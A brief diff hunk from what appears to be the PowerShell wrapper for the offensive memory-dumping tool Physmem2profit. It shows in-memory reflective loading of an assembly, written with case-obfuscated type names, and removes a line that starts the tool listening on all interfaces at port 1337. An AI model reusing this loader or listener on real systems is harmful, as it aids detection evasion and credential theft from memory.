@@ -11,4 +11,3 @@ function Invoke-Physmem2profit
     $RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
     [Physmem2profit.Program]::maiN($CoMmAND.Split())
 }
-Invoke-Physmem2profit -C "-i 0.0.0.0 -p 1337 -h"
